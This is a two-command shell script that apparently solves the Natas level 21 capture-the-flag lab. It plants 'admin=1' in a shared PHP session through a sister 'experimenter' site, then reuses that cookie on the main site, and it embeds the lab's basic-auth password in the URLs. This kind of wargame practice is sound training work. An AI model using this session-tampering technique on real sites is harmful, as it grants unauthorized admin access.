#!/bin/sh

COOKIE="PHPSESSID=lickme"

curl http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21-experimenter.natas.labs.overthewire.org/index.php?debug=1 --data "admin=1&submit=update" -b $COOKIE
curl http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21.natas.labs.overthewire.org/index.php?debug=1 -b $COOKIE
